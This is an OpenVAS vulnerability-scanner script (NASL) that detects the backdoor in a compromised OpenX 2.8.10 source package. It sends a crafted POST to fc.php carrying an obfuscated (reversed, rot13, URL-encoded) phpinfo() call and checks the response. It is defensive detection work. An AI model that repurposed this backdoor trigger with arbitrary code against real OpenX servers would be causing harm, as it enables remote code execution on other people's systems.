###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_openx_backdoor_61650.nasl 5842 2017-04-03 13:15:19Z cfi $
#
# OpenX 'flowplayer-3.1.1.min.js' Backdoor Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Attackers can exploit this issue to execute arbitrary code in the
context of the application. Successful attacks will compromise the
affected application.
Impact Level: Application";

CPE = "cpe:/a:openx:openx";

tag_insight = "The security issue is caused due to the distribution of a
compromised OpenX Source source code package containing a backdoor.";


tag_affected = "OpenX 2.8.10 is vulnerable; other versions may also be affected.";
tag_summary = "OpenX is prone to a backdoor vulnerability.";
tag_solution = "Updates are available.";
tag_vuldetect = "It was possible to execute 'phpinfo()' by sending a special crafted POST request";

if (description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.103755");
 script_bugtraq_id(61650);
 script_cve_id("CVE-2013-4211");
 script_tag(name:"cvss_base", value:"10.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
 script_version ("$Revision: 5842 $");

 script_name("OpenX 'flowplayer-3.1.1.min.js' Backdoor Vulnerability");


 script_xref(name:"URL", value:"http://www.securityfocus.com/bid/61650");
 script_xref(name:"URL", value:"http://blog.openx.org/08/important-update-for-openx-source-2-8-10-users/");
 
 script_tag(name:"last_modification", value:"$Date: 2017-04-03 15:15:19 +0200 (Mon, 03 Apr 2017) $");
 script_tag(name:"creation_date", value:"2013-08-09 14:28:44 +0200 (Fri, 09 Aug 2013)");
 script_category(ACT_ATTACK);
 script_tag(name:"qod_type", value:"remote_vul");
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
 script_dependencies("OpenX_detect.nasl");
 script_require_ports("Services/www", 80);
 script_mandatory_keys("openx/installed");

 script_tag(name : "impact" , value : tag_impact);
 script_tag(name : "vuldetect" , value : tag_vuldetect);
 script_tag(name : "insight" , value : tag_insight);
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 script_tag(name : "affected" , value : tag_affected);

 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

if(!port = get_app_port(cpe:CPE))exit(0);
if(!dir = get_app_location(cpe:CPE, port:port))exit(0);

ex = 'vastPlayer=%3B%29%28bsavcuc'; # phpinfo(); | reverse | rot13 | urlencode
len = strlen(ex);

host = http_host_name(port:port);

req = 'POST ' + dir + '/www/delivery/fc.php?file_to_serve=flowplayer/3.1.1/flowplayer-3.1.1.min.js&script=deliveryLog:vastServeVideoPlayer:player HTTP/1.1\r\n' +
      'Host: ' + host + '\r\n' + 
      'User-Agent: ' + OPENVAS_HTTP_USER_AGENT + '\r\n' +
      'Content-Length: ' + len + '\r\n' +
      'Content-Type: application/x-www-form-urlencoded\r\n' + 
      'Connection: close\r\n' + 
      '\r\n' + 
      ex;
result = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

if("<title>phpinfo()" >< result) {
  security_message(port:port);
  exit(0);
}

exit(99);
